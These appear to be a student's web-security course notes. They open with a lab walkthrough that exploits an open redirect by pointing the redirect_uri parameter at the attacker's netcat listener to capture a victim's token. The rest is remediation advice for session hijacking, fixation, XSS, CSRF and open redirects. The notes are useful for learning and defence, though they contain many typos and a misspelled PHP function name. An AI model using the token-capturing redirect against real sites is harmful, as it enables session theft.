Let us test if we can control the site where the redirect_uri parameter point. Let open netcat. Copy the entire URL where u landed after navigating to [onedirect.htb.net]
[http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN ASSIGNED BY THE APP>].
The edit this URL as follow:
[http://oredirect.htb.net/?redirect_uri=http://<VPN/TUN Adapter IP>:PORT&token=<RANDOM TOKEN ASSIGNED BY THE APP>]
When the victim enters their mail, we notice a connection begin made to our listener. The app vulnerable to Open Redirect.
WE get PWN.

___

## Remediation Advice:

It's essential to share remediation advice, know the remediation a vulnerability does help not only the client but also ourselves since we may quicly the existence of a vulnerability
by noticing the lack of a realted security measures.

- Remeding Sesision Hijacking:

Is pretty challeging to counter session Hijacking since valid session identifier grants access to an app by design. User session monitoring/anomaly detection solution can detected session
Hijacking. It's a safer bet to counter session Hijacking.

- Remediating Session Fixation:

Session Fixation can be remediated by generating a new session identifier upon an authentication operations. Theres no need a custom implementation to remediate session fixation.

- PHP
`sessin_regeneration_id(bool $delete_old_session = false); bool`
Deep detailed of [sessin_regeneration_id](https://www.php.net/manual/en/function.session-regenerate-id.phphttps://www.php.net/manual/en/function.session-regenerate-id.php)

- JAVA
```java
session.invalidate();
session = request.getSession(true);
```
Deep detail [Using Sessions](https://docs.oracle.com/cd/E19146-01/819-2634/6n4tl5kmm/index.html)

- .NET
For session invalidatuin purpouse, the .NET framework utilize Session.Abandon(), but there is caveat. Session.Abandon is not sufficient for
this task. States that when de cookie Abandon a session, the session ID cookie is not removed from the browser of the user. AS sonn as the session
has been Abandoned, any new request to the same app will use the same session ID but will have a new session state instances.

- Remediating  XSS:

The app should validate every input recieved immediately input recieved immediately upon receiving it. Input validation shoud be performed on the server-side
using a posotive approach, instead of a negative approach, since the positive approachs helps the programmer avoid potential flaws that result
form mishanding potentially malicius protentially malicius characters.
Validation implementation must include the following validation principles in the order:

1. Verify the exsitence of actual input, do not acept null or empty values when the input is not optimal.
2. Enforce input sixe restrictions, Make sure the input length is within the expected range.
3. Validate the input type, make sure the data type received is, the type expected, and stored the input in a variable of the desigmated type.
4. Restict the input range of value. The input's value should be within the acceptable range of value for the input's role in the app.
5. Sanitaze the special characters, unless is a unique funtional need, the input character set should be limited [a-z], [A-Z], [0-9].
6. Ensure logical input compliance.

- HTML encoding to user-controlled output.

1. Prior to embedding user-controlled input within browser targeted output.
2. Prior to documenting user-controlled input into log files.

The following inputs match the user-controlled criteria:

1. Dynamic values that originates directly from user input.
2. user-controlled data repository vales.
3. Session values originated directly form user input or user-controlled data repository.
4. Values received form external entities.
5. Any other value which could have been affected by the user.
6. The encoding proccess should verify that input matching the give criteria will be processed through a data sanitazation components, which will remplace non-alphanumerical character
in their HTML, representation before including these values in the output sent to the user or the log file. This operations ensure that every script
will be presented to the user Rather than execute in the user's browser.

- Additional Intructuions:
    - DO not embed user input into client-side scripts. Value dereving form user input should not be directly embedded as part of an HTML tag, script tag, event HTML or html property.
    - Complimentary intruction to protection the app against cross-site scripting can be found at the url [XSS](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
    - List of HTML encoded character representation can be found at the URL: [Special Character In HTML](https://www.degraeve.com/reference/specialcharacters.php)

Also note the CSP headers significantly reduce the risk and impact of XSS attacks on modern browser s by specific whitelist in the HTTP response. [Policy CSP](https://web.dev/articles/csp)

- Remediation CSRF:
The preferred way to reduce the ris of CSRF vulnerability is to modify session managment mechanims and implemented additional, ramdomly generated, and non-predictable security tokens.
Other mechanims that impede the ease of explotation iclude: Referrer header checking. Performing verification on the order in which pagea are called.
Forcing sensitive functions to confirm information received (two-step operation) – although none of these are effective as a defense in isolation and should be used in conjunction with the random token mentioned above.
[SameSite cookies explained](https://web.dev/articles/samesite-cookies-explained)

- Remediation Open Redirect:

1. Do no use user-supplied URLs and have methods to strictly validate the URL.
2. Of user input cannot avoided, ensure that the supplied value is valid, appropiated for the app, and is auth for the user.
3. It is recommended that any destination input be mapped to a value rather rhan the acutual url or portition of the URl and that server-side code traslates the value to the target URL.
4. Snaitaze the inputs by creating a list of trusted URLs.
5. Force all redirects to first go though a page notifying users that they are begin redirected from ur site and required to click links to confirm.
